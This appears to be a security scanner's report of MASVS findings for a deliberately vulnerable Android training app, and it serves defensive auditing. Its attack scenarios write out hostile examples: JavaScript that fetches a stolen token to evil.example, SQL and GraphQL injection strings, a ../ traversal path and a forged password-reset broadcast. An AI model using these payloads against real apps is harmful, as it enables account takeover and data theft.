result.description: Intent Redirection (confused deputy) vulnerability per MASVS-PLATFORM-1. The Activity extracts a nested Intent from an untrusted caller via getIntent().getParcelableExtra("forward_intent") and immediately forwards it using startActivity(forward) without validating the target component, package, or action. Because startActivity executes with this application's identity and permissions, the attacker-controlled nested Intent can be explicitly addressed to any of the app's non-exported activities, bypassing Android's exported-component restrictions. If the nested Intent carries FLAG_GRANT_READ_URI_PERMISSION/FLAG_GRANT_WRITE_URI_PERMISSION along with a content Uri, the app would also relay its own URI permissions to the attacker-chosen target. There is no allowlist check, no setComponent/setPackage to a trusted value, and no caller identity verification anywhere in the code path.
result.attack_scenario: Attacker's malicious app launches this exported Activity with an Intent containing a Parcelable extra named 'forward_intent'. The nested Intent is explicitly targeted at a non-exported, privileged component of VulnerAppDLHv2 (e.g., an internal settings, admin, or data-export Activity: new Intent().setComponent(new ComponentName("com.dlh.vulnerapp", "com.dlh.vulnerapp.InternalActivity")) with attacker-chosen extras). The vulnerable Activity calls startActivity(forward) with its own UID, so the system delivers the Intent to the non-exported component, which would otherwise be unreachable. The attacker thus gains unauthorized access to internal screens/functionality and can potentially trigger privileged actions or exfiltrate data displayed by the internal component.
result.recommendation: Do not forward Intents received from untrusted callers. If forwarding is strictly required: (1) validate the nested Intent's target against an explicit allowlist of components/packages before calling startActivity; (2) rebuild the Intent by explicitly setting a trusted component via setComponent()/setClass() instead of using the attacker-supplied target; (3) strip dangerous flags (FLAG_GRANT_READ_URI_PERMISSION, FLAG_GRANT_WRITE_URI_PERMISSION) and untrusted extras; (4) verify the caller's identity (e.g., checkCallingPermission, signature-level permission, or PendingIntent with immutable creator). If this Activity does not need to be reachable by other apps, set android:exported="false" in the manifest.
result.false_positive_analysis: The code pattern is unambiguous (tainted source getParcelableExtra -> unvalidated sink startActivity), so the only uncertainty is reachability: the AndroidManifest is not provided, so the Activity's exported status cannot be confirmed from the snippet alone. If android:exported="false" and it is not reachable via any intent-filter or other IPC bridge, the nested Intent could only originate from within the same app, reducing risk. However, the UI text ('Send a nested Intent in the forward_intent extra to redirect') strongly indicates the Activity is designed to accept such Intents from external callers, and the app/package naming suggests an intentionally vulnerable target. Additionally, if all internal components of the app are themselves exported or hold no privileged state, impact would be reduced, but this cannot be assumed.

masvs_reference.description: The app uses IPC mechanisms securely. Do not forward Intents received from untrusted callers without validating the target; a mutable/nested Intent enables confused-deputy attacks against non-exported components.

also_detected_by.description: Classic Intent Redirection / confused-deputy flaw (CWE-940/CWE-926 class, MASVS-PLATFORM). The activity extracts a fully caller-controlled nested Intent from the "forward_intent" Parcelable extra and launches it verbatim via startActivity() with zero validation of its component, action, data URI, or extras, and with no caller-identity or permission check. Because startActivity() executes under this application's identity, the nested Intent can explicitly target non-exported internal components of the same app, which Android's export model would normally block from external callers. This turns the activity into an open proxy for launching arbitrary in-app screens and actions.

result.evidence: if (Intrinsics.areEqual("com.dlh.vulnerapp.ACTION_RESET_PASSWORD", intent.getAction()) && (newPass = intent.getStringExtra("new_password")) != null) { Log.d("VulnerApp", "Password reset triggered via Broadcast! New Pass: " + newPass); Toast.makeText(context, "IPC Attack: Password Reset to " + newPass, 1).show(); }
result.description: SpoofableReceiver implicitly trusts any broadcast carrying the action 'com.dlh.vulnerapp.ACTION_RESET_PASSWORD' and consumes the 'new_password' string extra to trigger a password-reset flow. There is no caller identity verification, no signature-level permission guard, and no authentication token requirement — the security-sensitive decision (reset the password) is driven entirely by attacker-controllable Intent data. This is a classic IPC trust flaw: a broadcast is treated as an authoritative security signal when any app on the device can forge it. Additionally, the new password is written to logcat in plaintext, leaking the credential.
result.attack_scenario: Attacker installs (or already has) any app on the victim's device. That app calls sendBroadcast(new Intent("com.dlh.vulnerapp.ACTION_RESET_PASSWORD").putExtra("new_password", "attackerControlled123")). The vulnerable app's SpoofableReceiver receives the spoofed broadcast, accepts the attacker-supplied password with no verification, and triggers the password-reset flow — giving the attacker control of the victim's account. The new password is also exposed in logcat to any log-reading entity.
result.recommendation: Do not use unprotected broadcasts as a trigger for sensitive state changes. Remediate by: (1) declaring the receiver with android:exported="false" in the manifest if only internal components should reach it; (2) if cross-app delivery is required, protecting the receiver with a custom signature-level permission (android:protectionLevel="signature") and enforcing it via checkCallingOrSelfPermission / ContextCompat.checkSelfPermission in onReceive; (3) verifying the calling identity (Binder.getCallingUid()/PackageManager signature check) where feasible; (4) treating password reset as a server-side authenticated operation that requires a session token or a signed, single-use, server-issued token rather than a client-supplied 'new_password'; and (5) removing the plaintext password from Log.d output.
result.false_positive_analysis: The manifest is not provided, so the receiver's exported status is unknown: if android:exported="false" is declared (or the receiver is registered dynamically with RECEIVER_NOT_EXPORTED), only the app itself can deliver the broadcast, eliminating external spoofing. It is also possible (though unlikely given a custom action string) that a signature-level permission guard exists elsewhere, or that this snippet only logs/toasts and the real reset logic performs its own authentication. These unknowns lower confidence to Medium, but the code as shown contains no caller verification and handles the sensitive parameter unconditionally, so the trust flaw in the control flow is evident within the snippet itself.

result.evidence: private final void performBiometricAuth() { biometricLibraryCall(); ... textView.setText("Biometric Auth Success! (Or Bypassed)"); } | private final boolean biometricLibraryCall() { return false; } | private BiometricPrompt dummyPrompt; (declared but never initialized or used) | checkVipStatus(): ... this.isVip = true; Toast.makeText(this, "Debug: VIP Mode Enabled for next click", 0).show();
result.description: The biometric authentication flow is completely non-functional and bypassable. performBiometricAuth() invokes biometricLibraryCall() but discards its return value (which is hardcoded to 'false') and unconditionally displays 'Biometric Auth Success'. There is no BiometricPrompt.authenticate() call, no AuthenticationCallback, no onAuthenticationSucceeded gate, and no CryptoObject/Keystore binding. The declared 'dummyPrompt' BiometricPrompt field is never initialized or used. The 'authenticated' state is therefore reachable through normal control flow without any real authentication, violating MASVS-AUTH-2. Compounding this, checkVipStatus() grants VIP access via a mutable client-side boolean: on first click it denies access but silently sets isVip = true ('Debug: VIP Mode Enabled for next click'), so a second click yields 'Access Granted'. Sensitive decisions rest entirely on client-side flags.
result.attack_scenario: An attacker (or any unauthorized user holding the device) simply taps the biometric button: the app reports 'Biometric Auth Success!' without ever prompting for a fingerprint or face, since the result of biometricLibraryCall() is ignored and no real BiometricPrompt is shown. No lockscreen bypass, Frida hook, or exploit is even required. Alternatively, the attacker double-clicks the VIP button: the first click flips the client-side isVip flag to true, and the second click grants VIP access. Because there is no Keystore key gated by user authentication, nothing on the device can cryptographically distinguish a legitimate biometric event from this bypass.
result.recommendation: Implement real biometric authentication: build a BiometricPrompt with PromptInfo and call authenticate() with a BiometricPrompt.CryptoObject wrapping a cipher/key stored in the Android Keystore created with setUserAuthenticationRequired(true) (and setInvalidatedByBiometricEnrollment(true)). Perform the sensitive action only inside onAuthenticationSucceeded(AuthenticationResult) using result.getCryptoObject() to unlock/use the key — never trust a client-side boolean. Remove the hardcoded 'return false' stub and actually branch on the authentication outcome. Eliminate the debug backdoor in checkVipStatus() (the isVip = true toggle and debug Toast), and drive authorization from server-side or Keystore-attested state rather than mutable fields.
result.false_positive_analysis: Several signals (package name 'vulnerapp', field named 'dummyPrompt', literal string '(Or Bypassed)', and a 'Debug: VIP Mode Enabled' toast) indicate this is likely a deliberately vulnerable test/training application, so the flaw may be intentional rather than a production defect. Additionally, within this snippet the 'success' path only updates a TextView; if no downstream sensitive functionality (data decryption, transactions, session elevation) is actually gated by this check, real-world impact would be reduced. However, per the stated rule, the code contains distinct evidence of the vulnerable pattern: no real BiometricPrompt usage, an ignored authentication result, success reachable without authentication, and no cryptographic binding — so the finding stands as a genuine implementation flaw in the provided code.

masvs_reference.description: The app performs local authentication securely according to the platform best practices. Check for weak implementations of BiometricPrompt.

also_detected_by.description: Two distinct control-flow trust flaws. (1) Client-side privilege escalation: `isVip` is a mutable client-side boolean with no server-side verification; worse, the denial path silently flips it to true, so a second button click grants 'VIP User! Access Granted'. (2) Biometric authentication bypass: performBiometricAuth() invokes biometricLibraryCall() but ignores its return value (which is hardcoded to false) and unconditionally reports success. No BiometricPrompt.AuthenticationCallback is used, so the 'success' state is set outside any real authentication result — the exact `if(success || true)`-class flaw. Violates MASVS-AUTH (biometric auth must gate actions inside a verified success callback) and MASVS-RESILIENCE / MASVS-NETWORK (authorization decisions must be enforced server-side, never via client flags).

result.description: The generateWeakToken() method uses java.util.Random to generate a value explicitly labeled and used as a 'Session Token'. java.util.Random is a non-cryptographic, deterministic PRNG whose output is fully predictable once its seed (or a few outputs) is known. Using it to produce session tokens violates MASVS-CRYPTO-1, which mandates cryptographically secure random number generation (java.security.SecureRandom) for security-sensitive values such as tokens, nonces, and key material.
result.attack_scenario: An attacker who observes one or more session tokens generated by the app (e.g., by creating their own session or intercepting traffic) can reconstruct or narrow the internal state of the java.util.Random instance, since it uses a 48-bit linear congruential generator seeded predictably. The attacker can then predict future or past session tokens, enabling session hijacking and impersonation of other users without needing their credentials.
result.recommendation: Replace java.util.Random with java.security.SecureRandom for any security-sensitive value. For example: SecureRandom secureRandom = new SecureRandom(); byte[] tokenBytes = new byte[32]; secureRandom.nextBytes(tokenBytes); then encode with Base64/Hex. Additionally, session tokens should ideally be generated server-side and transmitted only over TLS, not generated and displayed on the client.
result.false_positive_analysis: The snippet only shows the token being displayed in a TextView labeled 'Session Token (Weak)', and there is no visible code transmitting it to a server or using it for authentication. If this token is purely a local demo/debug artifact never used for real session management, the practical impact would be reduced. However, the explicit naming as a session token indicates security intent, and per MASVS-CRYPTO-1 any security-context value generated with a weak PRNG is a vulnerability, so this is treated as a genuine finding with high confidence.

masvs_reference.description: The app employs current strong cryptography and uses it according to industry best practices. Use SecureRandom instead of weak RNGs.

result.evidence: FileOutputStream fOut = openFileOutput("public_secret.txt", 1); ... File file = new File(getFilesDir(), "public_secret.txt"); file.setReadable(true, false);
result.description: The createWorldReadableFile() method writes a file containing sensitive data ("This is a world-readable secret!") using openFileOutput() with mode 1, which is the deprecated Context.MODE_WORLD_READABLE flag. It then compounds the issue by explicitly calling file.setReadable(true, false), where the second argument 'false' means the file is readable by ALL users/apps, not just the owner. Both mechanisms violate MASVS-STORAGE-1, which requires sensitive data to be stored with appropriate file permissions (e.g., MODE_PRIVATE). Any app on the device can read this file's contents, defeating Android's application sandbox for this data.
result.attack_scenario: An attacker installs a malicious app on the same device (or leverages an already-present app with basic permissions). The malicious app reads /data/data/com.dlh.vulnerapp/files/public_secret.txt directly — no root or special permission is required because the file was created world-readable via MODE_WORLD_READABLE and setReadable(true, false). The attacker exfiltrates the 'secret' content. Had this been a real session token, credentials, or PII instead of a demo string, the attacker would gain full access to that sensitive data.
result.recommendation: Remove both insecure constructs. Use openFileOutput("secret.txt", Context.MODE_PRIVATE) (mode 0, the default) to keep the file private to the app, and delete the file.setReadable(true, false) call entirely. If sensitive data must be stored, additionally encrypt it at rest using the Android Keystore with Jetpack Security (EncryptedFile/EncryptedSharedPreferences). If cross-app sharing is genuinely required, use a FileProvider/content URI with explicit, temporary grantUriPermissions instead of world-readable permissions.
result.false_positive_analysis: The evidence is explicit and self-contained: mode literal 1 is documented as MODE_WORLD_READABLE and setReadable(true, false) unambiguously grants read access to all apps, so there is no realistic false-positive path within the snippet itself. The only mitigating considerations are contextual: (1) the class name and package ('vulnerapp', 'InsecureFileActivity') suggest this may be an intentionally vulnerable demo/training app, in which case the flaw is by design rather than accidental; (2) the stored string is a placeholder rather than real secrets — but the pattern would expose any real data written the same way. Neither changes the fact that the code violates MASVS-STORAGE-1.

masvs_reference.description: The app securely stores sensitive data. Ensure that the app uses appropriate file permissions (e.g., Context.MODE_PRIVATE) to protect data.

also_detected_by.description: The app writes a plaintext secret ('This is a world-readable secret!') to internal storage using openFileOutput with mode 1, which is the deprecated MODE_WORLD_READABLE constant. It then explicitly calls file.setReadable(true, false), setting the file's POSIX permissions to world-readable. This violates MASVS-STORAGE-1 twice over: (1) sensitive data (a 'secret') is stored in cleartext with no encryption (no EncryptedSharedPreferences, Keystore, or cipher), and (2) the storage location is made world-accessible, defeating the Android app sandbox's file permission protection. Any real credential, token, or PII stored via this pattern would be exposed to other apps or anyone with device access.

result.evidence: String filename = $fileNameInput.getText().toString(); ... File file = new File(getFilesDir(), filename); FileInputStream stream = new FileInputStream(file);
result.description: readFileVulnerable() constructs a File object from getFilesDir() concatenated with a fully user-controlled string taken from the fileNameInput EditText, then opens it with FileInputStream. There is no validation, allowlisting, or canonical-path check (e.g., file.getCanonicalPath().startsWith(getFilesDir().getCanonicalPath())) to ensure the resolved path stays inside the intended directory. A filename containing '../' sequences escapes the files directory, enabling arbitrary read of any file readable by the app's UID within its sandbox (shared_prefs, databases, other internal files). This violates MASVS-CODE-4, which requires untrusted file inputs to be validated/sanitized against path traversal.
result.attack_scenario: An attacker with access to this activity types '../../../../data/data/com.dlh.vulnerapp/shared_prefs/session.xml' (or any relative traversal payload) into the filename field and taps Read. new File(getFilesDir(), filename) resolves outside the files directory, and the file's contents are displayed in the contentOutput TextView, exposing sensitive app-private data such as tokens or credentials. The error branch additionally leaks the absolute attempted path, aiding reconnaissance.
result.recommendation: Validate the filename before use: reject any input containing '/', '\\', '..' or absolute paths, or restrict to a strict allowlist/regex (e.g., [a-zA-Z0-9._-]+). Enforce a canonical-path containment check: File f = new File(getFilesDir(), filename); if (!f.getCanonicalPath().startsWith(getFilesDir().getCanonicalPath() + File.separator)) reject. Do not echo resolved absolute paths in error messages.
result.false_positive_analysis: The tainted value originates from an EditText inside the app's own activity rather than an exported IPC surface (Intent extra, deep link, or ContentProvider), so practical exploitation generally requires control of the app's UI (device owner or another vector driving the input), which reduces real-world impact. Additionally, traversal is confined to files readable by the app's UID, so it cannot escape the app sandbox. However, per the stated rule, user text is a tainted source and the canonical-path guard is demonstrably absent, so the pattern is a true positive by the rule's definition.

masvs_reference.description: The app validates and sanitizes all untrusted inputs. Ensure that file inputs are validated to prevent Path Traversal attacks.

result.evidence: byte[] data = getIntent().getByteArrayExtra("data"); ... ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); Object obj = ois.readObject();
result.description: The activity reads a byte array from the 'data' Intent extra and passes it directly to ObjectInputStream.readObject() without any class validation or look-ahead filtering. Java native deserialization of attacker-controlled bytes allows instantiation of arbitrary classes present on the app/ART classpath during resolveClass, enabling gadget-chain exploitation that can lead to arbitrary code execution. This is a direct violation of MASVS-CODE-4 (untrusted input must be validated/sanitized; untrusted data must not be deserialized). No resolveClass override, ObjectInputFilter, or type whitelist (e.g., restricting to DemoData) is applied, and the deserialized object's type is never checked before use.
result.attack_scenario: An attacker crafts a malicious serialized Java object stream (e.g., using ysoserial-style gadget chains available in bundled libraries) and delivers it to this activity via the 'data' byte-array Intent extra. If the activity is exported, any installed app can launch it with the crafted payload; otherwise the payload can be injected through another component or deep link path. When onCreate() executes readObject(), the gadget chain is triggered during deserialization, achieving arbitrary code execution in the app's process, allowing theft of app data, tokens, or files.
result.recommendation: Avoid Java native serialization for untrusted data. Replace the mechanism with a safe format such as JSON (with strict schema validation) or Parcelable. If serialization must be retained, implement look-ahead deserialization: subclass ObjectInputStream and override resolveClass() to whitelist only expected classes (e.g., DemoData), or on Android 13+ set an ObjectInputFilter via ois.setObjectInputFilter() that rejects any class other than DemoData. Additionally, ensure the activity is not exported (android:exported="false") unless required, and validate the deserialized object's type with instanceof before use.
result.false_positive_analysis: Exploitability depends on factors not visible in the snippet: (1) the activity's exported status in the manifest — if it is non-exported and only reachable from fully trusted internal components, the attack surface is reduced, though Intent redirection or internal taint flows could still deliver hostile bytes; (2) successful RCE requires suitable gadget classes on the app's classpath, which cannot be confirmed from this file alone. However, the core pattern — readObject() on Intent-supplied bytes with no class filtering — is unambiguous in the code, so the vulnerability itself is confirmed with high confidence; only the real-world impact may vary.

masvs_reference.description: The app validates and sanitizes all untrusted inputs. Avoid deserializing untrusted data to prevent remote code execution.

also_detected_by.description: Conceptual trust flaw: the activity builds its privilege/identity object (DemoData containing an `admin` boolean role flag) entirely from client-controlled input — a byte array supplied through the `data` Intent extra — with no caller-identity check, no integrity/authenticity verification of the payload, and no server-side validation of the role. This violates MASVS-AUTH and MASVS-RESILIENCE principles: authorization/role state must be established and verified server-side, never derived from data the client can forge. Any component (or modified client) able to deliver an Intent to this activity dictates the resulting user/admin state. (The raw ObjectInputStream.readObject() deserialization primitive itself is owned by the dedicated insecure-deserialization rule and is not the basis of this finding.)

result.description: A hardcoded secret token ("SUPER_SECRET_TOKEN_FROM_BRIDGE") is embedded directly in the source code as a string literal returned by getSecrets(). This violates MASVS-STORAGE-2, which prohibits hardcoding sensitive data such as API keys or tokens in source code. Anyone can extract this value by decompiling the APK. The risk is amplified because the method is annotated with @JavascriptInterface and the WebView has JavaScript enabled (setJavaScriptEnabled(true)), meaning any web content loaded in the WebView (including attacker-controlled URLs supplied via the url input field or the deep link 'url' query parameter, which are loaded without any validation) can trivially retrieve the secret at runtime by calling window.AndroidBridge.getSecrets().
result.attack_scenario: An attacker decompiles the APK and extracts the hardcoded token 'SUPER_SECRET_TOKEN_FROM_BRIDGE' statically. Alternatively, the attacker crafts a malicious page containing <script>var s = AndroidBridge.getSecrets(); fetch('https://evil.example/steal?t='+s)</script> and lures the victim into opening it via the unvalidated deep link (vulnerapp://...?url=https://evil.example) or by having the victim type/paste the URL into the url input field. Since the JavaScript bridge is exposed to all loaded pages, the malicious script reads the secret at runtime and exfiltrates it.
result.recommendation: Remove the hardcoded token from source code. If a secret is genuinely required, inject it at build time via BuildConfig with values from CI/CD secrets or gradle properties, store it in native code via the NDK, or better, never ship secrets in the client at all — proxy sensitive calls through a backend. If a credential must be stored on device, use the Android Keystore / EncryptedSharedPreferences. Additionally, remove or restrict the JavaScript interface (do not expose secrets via @JavascriptInterface), validate/allowlist URLs before loadUrl(), and disable setAllowUniversalAccessFromFileURLs(true).
result.false_positive_analysis: The value 'SUPER_SECRET_TOKEN_FROM_BRIDGE' resembles a demonstration token, and the package name (com.dlh.vulnerapp) suggests an intentionally vulnerable training app, so this may be a dummy secret rather than a production credential. However, it matches the hardcoded-secret pattern exactly (a string literal named as a secret token returned from a method), and per the rule it is not an obvious placeholder like 'your_api_key' or 'REPLACE_ME'. If this pattern exists in a production build, it would be a genuine vulnerability regardless of the token's current validity.

masvs_reference.description: The app prevents leakage of sensitive data. Ensure that no sensitive data, such as API keys or passwords, is hardcoded in the source code.

result.evidence: webView.getSettings().setJavaScriptEnabled(true); webView.getSettings().setAllowUniversalAccessFromFileURLs(true); webView.getSettings().setAllowFileAccess(true); webView.addJavascriptInterface(new WebAppInterface(this), "AndroidBridge"); ... String deepLinkUrl = data.getQueryParameter("url"); ... webView.loadUrl(deepLinkUrl); ... @JavascriptInterface public final String getSecrets() { return "SUPER_SECRET_TOKEN_FROM_BRIDGE"; }
result.description: The WebView combines multiple dangerous settings: JavaScript is enabled, a JavascriptInterface ('AndroidBridge') exposes a native method getSecrets() that returns a hardcoded secret token, setAllowUniversalAccessFromFileURLs(true) lets file://-origin pages make unrestricted cross-origin requests (arbitrary local file/cookie theft), and setAllowFileAccess(true) permits file system access. Critically, the WebView loads fully attacker-controlled content: both an unvalidated deep-link query parameter ('url' from getIntent().getData()) and arbitrary user-entered URLs. Any page loaded in this WebView can call AndroidBridge.getSecrets() to steal the token, and if a file:// URL is loaded, universal access enables reading and exfiltrating arbitrary app files. This directly violates MASVS-PLATFORM-2 (WebViews must not expose critical interfaces to untrusted content or allow access to internal resources).
result.attack_scenario: Attacker crafts a malicious deep link such as 'vulnerapp://webview?url=https://evil.example/steal.html' and tricks the victim into opening it (phishing message, malicious site, or another app invoking the intent). The Activity loads the attacker's page into the WebView without validation. The page runs JavaScript: var secret = AndroidBridge.getSecrets(); fetch('https://evil.example/collect?token=' + secret) to exfiltrate the sensitive token. Alternatively, the attacker supplies a file:// URL pointing to a dropped/accessible HTML payload; because setAllowUniversalAccessFromFileURLs(true) is set, that page can XHR-read arbitrary local files (e.g., /data/data/com.dlh.vulnerapp/shared_prefs, cookies, WebView databases) and send them to the attacker's server.
result.recommendation: 1) Remove addJavascriptInterface entirely, or never expose methods returning secrets; if a bridge is required, only load first-party, integrity-protected content and gate sensitive methods behind origin checks. 2) Validate and allowlist any URL before loadUrl() (e.g., Uri.parse + scheme/host allowlist limited to https and trusted domains); reject file:// and content:// URLs. 3) Explicitly disable dangerous settings: setAllowUniversalAccessFromFileURLs(false), setAllowFileAccessFromFileURLs(false), and setAllowFileAccess(false) unless strictly needed. 4) Override shouldOverrideUrlLoading/shouldInterceptRequest to enforce navigation policy. 5) Do not export the Activity with a deep-link intent filter unless URLs are validated, and never store secrets in code reachable from the bridge.
result.false_positive_analysis: The Kotlin metadata indicates this is from a debug build ('app_debug'), so the hardcoded secret and insecure settings might be intended only for testing and could differ in release. The AndroidManifest is not provided, so it is unconfirmed whether the Activity is exported with a deep-link intent filter; if it is not exported, remote exploitation relies on the user typing a malicious URL into the EditText, which lowers (but does not eliminate) the risk. Additionally, 'SUPER_SECRET_TOKEN_FROM_BRIDGE' may be a placeholder rather than a real credential. These factors affect real-world impact but not the presence of the insecure WebView configuration pattern itself, hence confidence remains High.

masvs_reference.description: The app uses WebViews securely. Ensure that WebViews do not expose critical interfaces or allow untrusted content to access internal resources.

also_detected_by.description: The WebView explicitly enables setAllowFileAccess(true) and setAllowUniversalAccessFromFileURLs(true) in direct violation of MASVS-PLATFORM-2. JavaScript is also enabled and a JavascriptInterface ('AndroidBridge') exposing a sensitive method getSecrets() (which returns a hardcoded secret token) is attached. Additionally, arbitrary URLs can be loaded into this WebView both via an unvalidated deep link query parameter (getIntent().getData().getQueryParameter("url")) and via free-form user input, with no scheme/host allowlisting. The combination of universal access from file URLs plus the ability to load attacker-controlled content means a malicious page or file:// URL can use XMLHttpRequest/fetch to read arbitrary local files (including app private storage, cookies, and databases) and exfiltrate them, or invoke the exposed JS bridge to steal secrets.

The WebView has JavaScript enabled and loads a URL taken directly from the Intent deep-link query parameter 'url' (getIntent().getData().getQueryParameter("url") -> loadUrl()) with no scheme/host validation or allowlisting. The same unsanitized pattern exists for the EditText input. Additionally, a JavaScript bridge ('AndroidBridge') exposing getSecrets() (which returns a sensitive token) and showToast() is registered and therefore accessible to ANY page loaded in the WebView, including attacker-controlled pages. setAllowUniversalAccessFromFileURLs(true) and setAllowFileAccess(true) further permit file:// content and cross-origin file access, amplifying the impact (local file theft). This violates MASVS-PLATFORM-2 (secure WebView configuration and restricted JS bridges).

IPC/Intent trust flaw: the activity takes a 'url' parameter straight from the incoming Intent (deep link) and loads it into a WebView with zero validation of scheme, host, or caller identity. That same WebView has a JavascriptInterface bridge ('AndroidBridge') exposing getSecrets(), which returns a sensitive token to ANY JavaScript running in the WebView. The security-sensitive context (privileged JS bridge) is therefore granted to whatever origin an attacker supplies via the intent, with no allowlist, no caller/permission check, and no origin gating of the bridge. This is a genuine trust/control-flow flaw: the app trusts attacker-controlled Intent data to decide which code gets access to a privileged native interface.

result.evidence: String userInput = $inputUser.getText().toString(); ... String query = "{\"query\": \"query { user(name: \\\"" + userInput + "\\\") { id name email } }\"}";
result.description: User input from an EditText (inputGraphQLParams) is directly concatenated into a GraphQL query string without any validation, sanitization, or escaping. The GraphQL specification provides variables ($var) precisely to avoid this; here the tainted value is interpolated into the query body inside the quoted 'name' argument. An attacker can break out of the string context with a double-quote and inject arbitrary fields, arguments, aliases, or additional root queries, violating MASVS-CODE-4 (all untrusted input must be validated/sanitized before use in API calls).
result.attack_scenario: Attacker enters: x") { password ssn } } query { users { id name  into the input field. The resulting query becomes: query { user(name: "x") { password ssn } } query { users { id name ") { id name email } } which, when sent to a GraphQL backend, would return sensitive fields (password, ssn) on the user object and enumerate the users collection — data the original query never intended to expose. Attackers could also probe schema via injected __schema introspection queries.
result.recommendation: Never concatenate user input into GraphQL query strings. Use GraphQL variables: build the payload as {"query": "query($name: String!) { user(name: $name) { id name email } }", "variables": {"name": userInput}} and let the GraphQL client/server handle escaping. Additionally, whitelist-validate the input (e.g., allowed name characters), disable introspection in production, enforce field-level authorization on the backend, and use a typed GraphQL client (Apollo) which enforces variable-based arguments.
result.false_positive_analysis: In this specific snippet, the constructed query string is only written to a TextView for display and is not shown being transmitted to a network backend, so within the visible code the injection has no direct data-exposure impact. The class/method names (GraphQLInjectionActivity, executeVulnerableQuery) also indicate this is an intentionally vulnerable training app. However, the unsafe concatenation pattern itself is unambiguous and directly matches the GraphQL injection pattern defined by the rule; if this string is passed to any HTTP layer elsewhere in the app, it becomes fully exploitable, so the finding stands as a genuine input-validation failure under MASVS-CODE-4.

masvs_reference.description: The app validates and sanitizes all untrusted inputs. Ensure that API inputs are validated to prevent injection attacks.

result.evidence:
Intent baseIntent = new Intent();
PendingIntent pending = PendingIntent.getActivity(this, 0, baseIntent, 33554432);
result.description: The PendingIntent is created via PendingIntent.getActivity() with flags = 33554432 (0x02000000), which is exactly PendingIntent.FLAG_MUTABLE. FLAG_IMMUTABLE (0x04000000 / 67108864) is not set. Additionally, the base Intent is an empty, implicit Intent (no component, package, action, or data set), meaning any holder of this PendingIntent can arbitrarily fill in the Intent's destination and extras. This directly violates MASVS-PLATFORM-1, which requires PendingIntents to be immutable to prevent privilege escalation. The app's own UI text even acknowledges the flaw: '(base intent is implicit -> hijackable)'.
result.attack_scenario: If this PendingIntent is handed to another app or system service (e.g., via a Notification, AlarmManager, or an exported component), the receiving malicious app exploits the mutability by calling Intent.fillIn() on the base intent, injecting a target component (including a non-exported Activity of this app) and malicious extras. When the PendingIntent is later fired, it executes with the victim app's identity and permissions, launching an attacker-chosen internal component or performing an unauthorized action, achieving privilege escalation.
result.recommendation: Create the PendingIntent with PendingIntent.FLAG_IMMUTABLE, e.g., PendingIntent.getActivity(this, 0, baseIntent, PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE). Only use FLAG_MUTABLE when strictly required (e.g., inline notification replies), and in that case make the base Intent explicit by setting an explicit component or package (intent.setClassName(...) / setPackage(...)) so the mutable fields cannot redirect it.
result.false_positive_analysis: Within this snippet, the PendingIntent is only created and printed to a TextView; it is not shown being passed to a Notification, AlarmManager, widget, or another app, so no actual hijack sink is visible here and real-world exploitation depends on code outside the provided snippet. However, per MASVS-PLATFORM-1 and Android lint rules, creating a FLAG_MUTABLE PendingIntent with an implicit base intent is itself the reportable defect regardless of the downstream handoff, so the finding stands; only the severity of immediate exploitability is context-dependent.

masvs_reference.description: The app uses IPC mechanisms securely. Ensure that PendingIntents are created as immutable where possible to prevent privilege escalation.

also_detected_by.description: The app creates a PendingIntent with FLAG_MUTABLE (33554432 = 0x02000000) wrapped around an implicit, empty base Intent. This is an IPC trust flaw: because the base intent is mutable and has no explicit component/package, any app that obtains this PendingIntent can modify (fillIn) the underlying intent and have it executed with the creating app's (com.dlh.vulnerapp) identity and permissions. This violates MASVS-PLATFORM intent-handling principles and matches the well-known mutable implicit PendingIntent hijacking pattern (cf. CVE-2020-8913). The app itself even annotates the output as '(base intent is implicit -> hijackable)'.

result.evidence: String sql = "SELECT * FROM users WHERE name = '" + username + '\''; ... Cursor cursor = db.rawQuery(sql, null);
result.description: The performVulnerableSearch() method builds a SQL query by directly concatenating the 'username' parameter into the SQL string without any sanitization or parameterization. The 'username' value is tainted: it originates from an EditText (searchInput.getText().toString() in onCreate$lambda$0) and is passed unvalidated into performVulnerableSearch(). The concatenated query is then executed via db.rawQuery(sql, null) with no bound selectionArgs. This is a textbook SQL Injection violating MASVS-CODE-4 (untrusted input is not validated/sanitized before use in an SQL statement). Results, including the 'secret' column, are displayed in the UI, making data exfiltration trivial.
result.attack_scenario: An attacker with access to the app's search screen enters a crafted payload into the EditText, e.g. ' OR '1'='1' -- which transforms the query into SELECT * FROM users WHERE name = '' OR '1'='1' --', causing the database to return all rows. The app then renders each row's 'name' and 'secret' columns in resultView, exposing sensitive data such as the admin secret ('Flag{SQL_Injection_Success}'). Alternatively, a payload like ' UNION SELECT sqlite_version(), name FROM sqlite_master -- could enumerate schema, and stacked/UNION-based payloads could extract arbitrary table contents. Because the input is fully attacker-controlled and directly concatenated, no authentication or special access is required.
result.recommendation: Use parameterized queries with bound arguments instead of string concatenation. Replace the vulnerable code with: String sql = "SELECT * FROM users WHERE name = ?"; Cursor cursor = db.rawQuery(sql, new String[]{ username }); Alternatively use db.query("users", null, "name = ?", new String[]{username}, null, null, null). Never interpolate user input into SQL strings; additionally apply input validation (e.g., expected character allowlist) as defense-in-depth and avoid rendering raw query strings/results or SQL error messages to the UI.
result.false_positive_analysis: There is essentially no false-positive scenario for this pattern: the tainted value flows directly from an EditText to rawQuery via concatenation with no intervening sanitization. The only mitigating context is that this appears to be a deliberately vulnerable training/demo application (package 'com.dlh.vulnerapp', class 'SQLInjectionActivity', method 'performVulnerableSearch', debug build flag data), and the database is local to the app containing dummy data, so real-world impact may be limited. However, the code pattern itself is unambiguously vulnerable per MASVS-CODE-4.

masvs_reference.description: The app validates and sanitizes all untrusted inputs. Ensure that inputs are validated to prevent Injection attacks.

result.evidence: String className = getIntent().getStringExtra("class_name"); ... Object instance = Class.forName(className).getDeclaredConstructor(new Class[0]).newInstance(new Object[0]);
result.description: The Activity reads a class name directly from an Intent extra ("class_name") and passes it unvalidated to Class.forName(), then instantiates it via the no-arg constructor with newInstance(). This is unsafe reflection on untrusted input (MASVS-CODE-4 violation): any component that can launch this Activity can force the app to load and instantiate arbitrary classes present on the app's classpath. Although only no-argument constructors can be invoked, many classes perform dangerous operations in their constructors or static initializer blocks (file I/O, network access, native library loading, process execution setup), enabling unintended code execution paths, side-effect triggering, internal class probing, and denial of service.
